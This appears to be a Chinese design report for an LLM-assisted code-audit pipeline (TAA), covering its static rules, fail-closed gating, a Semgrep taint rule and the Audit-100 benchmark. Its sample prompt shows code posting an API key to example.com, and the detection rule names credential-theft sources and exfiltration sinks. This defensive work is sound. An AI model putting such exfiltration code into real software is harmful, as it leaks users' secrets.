TAA 代码审计设计报告

离线本地推理 LLM 失败必须显式 默认 fail-closed 可回放 可评测
目标

让审计结果可解释、可追踪、可复现，并且在 LLM 不可用或不确定时不默认放行。

范围

聚焦现有 TAA 审计流水线、训练报告投影和 benchmark 设计，不另起新系统，只补齐治理层与评测层。

依据

结合 `qwen-audit-implementation-design.md`、`audit-rules-design.md`、`audit-prompt-matrix.md`、`audit-evaluation-results-template.md` 与 `audit-eval-iteration-log.md` 的已有结论。

1. 设计框架

本节描述 TAA 代码审计的分层框架，以及各层之间的输入、输出和职责分配。图中实线表示现有框架，下方虚线带表示最终完整框架中待补的检索增强与结构化表示增强。

2. 静态规则与扫描窗口

静态扫描不是模糊的“找可疑代码”，而是一个可枚举的规则表。当前 analyzer 只扫描 Python 文件，跳过注释行、隐藏目录和 `__pycache__`，每条命中都会带出固定大小的上下文窗口。

扫描范围

扫描什么，不扫描什么

  • 只遍历以 `.py` 结尾的文件。
  • 递归进入普通子目录，但跳过以 `.` 开头的目录和 `__pycache__`。
  • 如果一行以 `#` 或 `//` 开头，直接跳过，不做规则匹配。
  • 规则命中后只取当前行对应的上下文，不回头做跨文件图搜索。
上下文窗口

邻近行到底是多少行

  • 当前实现固定取触发行前 3 行 和后 3 行。
  • 窗口公式等价于：start = max(0, i-3)，end = min(len(lines), i+4)。
  • 返回给 LLM 的 context_before 不含当前行，context_after 也不含当前行。
  • 也就是说，LLM 看到的是“前 3 行 + 触发行 + 后 3 行”，共最多 7 行。

🎯

进阶演进：引入 Semgrep 深度语义与污点扫描引擎

从单行文本正则匹配升级为 AST 语法树结构化分析与数据流追踪
架构升级提案 · AST & 污点分析

当前静态扫描基于纯文本与正则匹配（Regex Scanner），具备极低延迟（<10ms）与零外部依赖的天然优势；但在面临攻击者采用模块导入重命名（Alias Evasion）、动态反射加载与跨行数据传递时存在检测盲区。 将 Semgrep 引入 TAA 静态扫描层，能够基于抽象语法树（AST）建立语义模式匹配与端到端污点追踪（Taint Tracking），使第一道防线从“单行关键词粗筛”跃升为“结构化攻击链路预判”。

⚠️ 现状：纯文本 / 正则扫描 (Regex Baseline) 当前引擎
  • 匹配粒度：基于单行文本字符串或基础正则，逐行无状态扫描。
  • 别名逃逸盲区：无法感知 import socket as s; s.connect() 或 getattr(os, "system") 等别名重命名。
  • 数据流盲区：无法判断变量取值来源，无法追踪 key = os.getenv(); requests.post(key) 的跨行传递。
  • 证据颗粒：仅能机械切取触发行前后固定的 3 行物理代码作为局部上下文。
🚀 增强：Semgrep AST 语义与污点引擎 (Semgrep Enhanced) 引入后提升
  • 匹配粒度：基于抽象语法树（AST）节点匹配，天然理解 Python 语言结构与作用域。
  • 语法归一化：无论函数如何起别名、引用重命名，AST 层面全部归一化为统一调用签名。
  • 跨行污点追踪：支持 pattern-sources → pattern-sinks，完整追踪敏感数据从读取到外发的全链路。
  • 结构化证据链：输出清晰的数据流流动节点清单（Taint Path），直接向 LLM 提供高信度事实证据。
🛡️ 1. 消除别名与混淆逃逸

基于语法树符号解析，即便攻击代码采用 import urllib.request as u、from os import system as cmd 或将敏感库解构重命名，Semgrep 均能穿透混淆并准确捕获调用点。

🧬 2. 跨行污点渗漏追踪 (Taint)

将“凭证读取”（Source，如 os.environ、.ssh）与“网络外发”（Sink，如 requests.post、socket.send）关联。只要变量产生数据流交叉即触发污点告警，识别真正的外发通道。

🎯 3. 压降 40%~60% 语法误报

利用 pattern-not-inside 语法排除测试框架（如 pytest/unittest 中的 mock 调用）与绘图指标上报代码，在进入大模型前滤除无效噪点，大幅节省 TEE 容器内推理算力。

🤖 4. 赋能 LLM 结构化证据链

打破传统 7 行固定上下文的割裂限制，将 Semgrep 计算出的污点流动跃迁行号与调用链直接注入 Finding Prompt，让大模型免于在冗余代码中盲目搜索，使研判准确度呈代际提升。

📋 框架适配示例：TAA 敏感凭证跨行外传污点规则 (Semgrep Taint Rule Spec)
# Semgrep 污点分析规则：捕获敏感凭据提取并经由网络外发 rules: - id: taa-secret-exfiltration-taint languages: [python] severity: ERROR message: "检测到系统敏感环境变量或私钥凭证通过网络信道被外发传出" mode: taint pattern-sources: - pattern: os.environ[...] - pattern: os.getenv(...) - pattern: open(..., ".ssh/id_rsa").read() pattern-sinks: - pattern: requests.post(..., data=$VAR, ...) - pattern: requests.get(..., params=$VAR, ...) - pattern: socket.socket().sendall(...) pattern-not-inside: - pattern: | def test_...(...): ...
设计判断：静态扫描的职责不是“判断有没有恶意”，而是“把值得判断的代码段精确送进 LLM”。所以规则必须宽，但证据必须窄；命中可以多，但上下文一定要短、准、可解释。

3. LLM 输入与返回契约

命中规则后，送给 LLM 的不是整文件，而是一个明确的 finding prompt 或 file prompt。二者用途不同：前者用于单点语义确认，后者用于文件级攻击链判断。

Finding 级

传给 LLM 的字段

  • file：完整路径。
  • line：触发规则的行号。
  • rule_id、category、description：规则语义。
  • context_before：触发行前 3 行。
  • code_snippet：触发行本身。
  • context_after：触发行后 3 行。
你是一个代码安全审计专家。请分析以下代码片段是否存在窃取数据、外传数据或其他恶意行为。 ## 代码片段 文件: /path/to/sample.py (第 42 行) ```python import os import requests api_key = os.getenv("API_KEY") >>> requests.post("https://example.com/upload", json={"key": api_key}) print("done") ``` ## 触发的规则 规则ID: NET_001 类别: 网络请求 严重度: HIGH 规则说明: 检测显式 HTTP/HTTPS 传输点，用于识别外传或远端控制。 ## 请回答 1. verdict: MALICIOUS(恶意) / SUSPICIOUS(可疑) / BENIGN(正常) / UNCERTAIN(不确定) 2. reason: 一句话说明理由（中文） 3. risk: 如果恶意，数据会怎样被利用 请严格按以下 JSON 格式回答，不要包含其他内容: {"verdict":"...","reason":"...","risk":"..."}
File 级

传给 LLM 的字段

  • file：文件 basename，不再需要完整路径。
  • line_count：文件总行数。
  • findings_count：静态命中数。
  • findings_summary：去重后的规则摘要，格式如 CMD_001(命令执行,HIGH)。
  • full_code：最多前 80 行源码；超过后追加截断说明。
文件: sample.py (123 行) 发现 4 个可疑点: CMD_001(命令执行,HIGH), EXF_001(数据外传,HIGH) ```python 前 80 行代码 # ... (截断，文件超过 80 行) ``` 严格按 JSON 回答: {"risk_level":"HIGH|MEDIUM|LOW|UNCERTAIN","summary":"一句话安全结论","chained":true,"exfiltration":true}

输出规则

返回什么，失败时怎么办

  • Finding 级必须返回 verdict / reason / risk。
  • File 级必须返回 risk_level / summary / chained / exfiltration。
  • 后端缺失时，直接返回 UNCERTAIN，理由写“未配置推理后端”。
  • 模型返回无法解析时，继续返回 UNCERTAIN，理由保留原始错误。
  • Fail-Closed 判定底线：存在高/中危告警且大模型返回 UNCERTAIN（或超时/解析失败）时，门禁必须维持阻断（passed = false），绝对杜绝安全穿透。
  • File 级决策联动：若文件级分析判定 chained = true 或 exfiltration = true，直接升级全局风险并触发门禁拦截。

解析策略

只接 JSON，不接散文

  • 调用侧把温度固定到 0.1，减少漂移。
  • 返回文本只做一次 JSON 提取，不做多轮猜测。
  • 提取失败即转 UNCERTAIN，不允许“猜一个像样的标签”。
  • 这就是 fail-closed 的具体实现：失败状态必须进入结果，而不是消失。

4. Benchmark 评测基准设计 (Audit-100)

评估代码安全审计引擎的核心挑战在于平衡误报率（False Positive Rate, FPR）与漏报率（False Negative Rate, FNR），并在有限计算资源下追求最高性价比。当前行业内存在两大技术流派：一是激进的【纯端到端 LLM 审计（Pure-LLM）】，即直接将全量源代码塞入大模型，不做任何先验规则过滤；二是工程化的【动静两阶段协同审计（Static-LLM）】，通过静态规则完成毫秒级初筛与零命中算力旁路，并仅将疑点及行级规则上下文锚定交付大模型定点仲裁。为此，我们设计并构建了标准化的 Audit-100 Benchmark，作为评估两套范式在准确率、算力开销与攻防鲁棒性上的可度量标尺。

🎯

基准全景：4 大真实工业基座 / 10 细分对抗家族 / 100 样本完全正交平衡矩阵

评测基准选用开源社区 4 大工业级经典算法训练工程（XGBoost-Finance 真实表格金融风控、Retina-ResNet 真实医学影像视觉分类、Detection-Industrial 工业表面缺陷检测、BERT-Sentiment 真实 HuggingFace 文本情感微调）作为源码基座，严格派生出 100 个具备独立沙箱的代码样本。 样本集按 50 个良性误报探针（Benign FP Probes） 与 50 个恶意攻击载荷（Malicious Attack Samples） 在 4 大基座中呈 1:1 严格正交对称分布（每个基座各含 12~13 个良性与 13~12 个恶意样本）， 实现领域分布与标签属性完全解耦，用于精准对比“纯端到端 LLM 盲审”与“静态快速初筛 + LLM 定向语义仲裁”在实际算法工程代码中的综合对抗能力与工程 ROI。

⚖️ 双轨范式的理论基础与工程假设对比

为了客观量化大模型在代码安全审计中的真实增量价值与工程局限，基准体系确立了鲜明的双轨对照假设：

🤖 方案 A：纯端到端 LLM 盲审 (Pure-LLM Baseline) 算力旁路率: 0%

审计逻辑：完全绕过静态正则与 AST 预处理，将样本文件（全量代码或前 80~200 行源码）直接拼入 Prompt，由大模型端到端理解代码并输出最终安全结论。

理论假设与运行特性：
1. 无法进行快速旁路（Bypass Rate 0%）：必须对 100% 的代码样本进行高功耗大模型推理，GPU/CPU 算力消耗高企，批量扫描延迟达数秒乃至十几秒。
2. 长上下文注意力涣散 (Lost in the Middle)：端到端大模型缺少精准的代码违规行号与模式引导，在长源码中难以准确定位隐蔽的反弹 Shell 或多层混淆代码，导致漏报率（FNR）上升。
3. 常规业务高度过敏 (High FPR)：小参数模型面对复杂的类封装、环境目录探测（os.environ.get）或正常日志打印时缺乏边界约束，极易产生“安全幻觉”，草率定性为恶意外传。

⚡ 方案 B：动静两阶段协同体系 (Static + LLM Synergistic) 算力旁路率: 50%

审计逻辑：Stage 1 采用高吞吐静态正则进行毫秒级宽召回初筛；对零命中代码直接快速放行；仅对命中疑点的样本，将行级锚点（上下文 7 行）与规则特征元数据注入 LLM 做定向语义仲裁。

理论假设与工程优势：
1. 精准 50% 快速旁路：50 个纯净良性样本被静态规则以 <50ms 极速确认并放行，免唤醒大模型，推理能耗与推断总延迟直接减半。
2. 定点聚焦与先验约束：静态初筛为 LLM 提供了精准的行号、触发规则与局部上下文，让小模型从“全篇盲搜”转化为“靶向释疑”，有效压制语法假阳性，良性误报率（FPR）大幅压降。
3. Fail-Closed 保底防穿透：针对深度混淆导致小模型输出 UNCERTAIN 时，安全门禁强行维持拦截策略，彻底杜绝恶意代码因模型能力局限而逃逸放行。

🛡️ 50 组良性探针样本（误报抑制与语义豁免测试） 预期决策：放行 (PASS)

构造原理：覆盖算法工程中的合法操作（文件 I/O 读参、环境目录获取、指标标准输出、模型结构序列化落盘等）。用于检验纯 LLM 是否产生过度敏感，以及协同体系中 LLM 能否结合上下文精准豁免合规代码。

🚨 50 组恶意攻击样本（威胁捕获与载荷识别测试） 预期决策：阻断 (BLOCK)

构造原理：覆盖子进程命令派生、敏感凭据窥探、反弹 Socket/HTTP 外联通信、Base64/Pickle 混淆载荷以及系统级持久化后门。用于检验纯 LLM 盲审与协同双阶段模式下的攻防对抗鲁棒性。

🧩 10 维代码变体家族矩阵（5 良性 B1~B5 + 5 恶意 M1~M5）

评测集将 100 个样本结构化归类为 10 个特定代码家族（Family），每个家族各包含 10 个同类变体样本。此举消除了黑盒测试中的归因模糊性，任何指标波动均能精确定位至具体的语义对抗维度：

B1 等价语法重构 (Pure Refactor)
良性基线 (10样本)

函数拆分、变量重命名、import 路径重组与目录重构。验证静态与大模型对“代码形态改变但控制流等价”的代码保持稳定性，不产生无意义告警。

预期命中规则：无 预期裁决：BENIGN (放行)
B2 诊断日志与状态打点 (Safe Logging)
良性基线 (10样本)

标准输出模型训练 Loss、准确率指标、Step 计数与进度打点。验证审计器能够准确区分常规指标打印与敏感数据（如 Token/密码）打印泄露。

🔄 评测生命周期流水线：双轨全自动化度量与验证

1
样本实体化 (Materialize)

基于基准库生成 100 个独立隔离的工程目录，注入 sample.json 元数据并固化真值标签 (Ground Truth)。

2
纯端到端 LLM 盲审 (Pure-LLM)

绕过任何静态规则初筛，将全代码直接输入大模型做端到端语义分析。记录 100% 样本的推断开销与原始误报率。

3
动静两阶段协同 (Static-LLM)

静态规则初筛过滤纯净代码（零耗时快速旁路），并将命中的可疑行号与局部上下文作为锚点交付大模型做靶向裁决与误报纠偏。

4
指标聚合与双轨对比 (Metrics)

对比两套方案的 Accuracy、F1、FPR、FNR、平均延迟与 Fail-Closed 触发数，自动输出 12 组多维对比报告。

为什么必须建立【纯 LLM】与【动静两阶段协同】的严格对比？ 工业界容易产生对大模型“全知全能”的误判，试图用端到端大模型取代所有安全规则。然而，实测证明纯端到端大模型在没有静态语法引导时，对常规配置极易发生虚警（FPR 畸高），面对混淆代码缺乏抓手，且推断算力成本沉重。通过标准化的双轨基准，才能清晰验证：动静协同架构以 50% 快速旁路率削减算力开销，以行级规则锚点大幅压降模型误报，并以 Fail-Closed 兜牢安全底线的理论优越性。

🏷️ 基准评测协议生命周期版本标注 (Protocol Lifecycle Status) v2 正交实测基准 · 三轨 18 组全矩阵实测

基准版本说明：本章节展示的 18 组对照数据属于 Audit-100 v2 全正交基准实测大盘（6 款 Qwen 本地模型 × 3 种评测方案）。基准体系基于 4 大真实工业微工程基座（金融风控、医学眼底、工业缺陷、情感分析）构建严格 50:50 良恶均衡的 100 个自包含测试沙箱，采用全正交平衡设计；统合同步 Go 与 Python 13 条静态规则，引入 Finding 锚点动态切片与严格 Fail-Closed 安全门禁；并在国内代码安全评测中首次引入 关键攻击归因率 (Attribution Precision) 与 1,000 次 Bootstrap 95% 置信区间。

Audit-100 v2 评测套件在受控测试沙箱环境中，针对本地离线模型库支持的全部 6 款 Qwen 审计大模型（qwen2.5-coder:0.5b、1.5b、3b、7b、qwen3:8b、14b），全面执行了【Track A: 纯端到端 LLM 盲审 (Pure Raw)】、【Track B: 纯 LLM 带规则清单 (Pure Checklist)】与【Track C: 生产级动静两阶段协同 (Static-LLM)】的 18 组严密对照评测。实测数据定量揭示了动静协同架构的三大核心工程优势：在相同模型下将良性误报率（FPR）压降至 6%~20%；通过静态零命中实现 50% 算力零成本快速旁路；并将关键攻击归因率提升至 93.5%~98.0%；同时在模型超限或宕机时通过 Fail-Closed 守牢 100% 拦截底线。

📐 评测核心指标定义与统计口径说明 基准测试采用机器学习与信息安全体系严格的二分类统计口径，基于 100 组金标样本（50 良性合规探针 + 50 真实恶意载荷）量化计算
准确率 (Accuracy / Acc) (TP + TN) / Total

指标含义：在全部 100 个代码样本中，系统最终判定结论完全正确（恶意拦截 + 良性放行）的比例。

安全工程意义：反映系统整体识别大盘质量，配合 95% 置信区间消除样本随机扰动。

召回率 (Recall / Rec / 查全率) TP / (TP + FN)

指标含义：在全部 50 个真实恶意攻击载荷中，系统成功揪出并实施阻断的比例（漏报越少，召回率越趋近 100%）。

安全工程意义：【安全防漏底线】衡量系统防御深度。召回率低意味着后门木马可能逃逸进入 TEE 隔离区。

误报率 (False Positive Rate / FPR) FP / (FP + TN)

指标含义：在全部 50 个正常合规业务代码中，系统误将其断定为恶意而拦截的比例（误杀越少，FPR 越低）。

安全工程意义：【业务可用性生命线】误报率过高会导致大量科研、训练算法脚本被误杀，造成业务停摆与告警疲劳。

关键攻击归因率 (Attribution Precision) True Attributions / Blocked Malicious

指标含义：在被拦截的恶意样本中，系统精准定位并指出真实恶意行（primary_attack_finding）的比例。

安全工程意义：【杜绝伪召回】杜绝大模型因对合规代码产生幻觉、碰巧拦截样本而导致的统计虚高，确保真因真防。

混淆分布 (Confusion Matrix: TP / FP / TN / FN) 样本总量 = TP + FP + TN + FN = 100 (恶意 50 + 良性 50)

四元组定量分解系统对 100 组金标测试用例的四种微观决策流向，是所有衍生评价指标的原始事实底座：

TP (True Positive, 真正例)
恶意拦截成功（捕获坏人）：真实恶意载荷样本，被系统正确识别为安全违规并有效阻断。
FP (False Positive, 假正例/误报)
良性代码误杀（冤枉好人）：正常合规业务样本，被系统过度敏感误判为违规并阻断拦截。
TN (True Negative, 真反例)
合规正常放行（放行好人）：正常合规业务样本，被系统正确断定为安全无毒并毫秒级放行通过。
FN (False Negative, 假反例/漏报)
恶意载荷逃逸（放跑坏人）：真实恶意载荷样本，系统出现漏判未识别，导致危险代码违规放行。
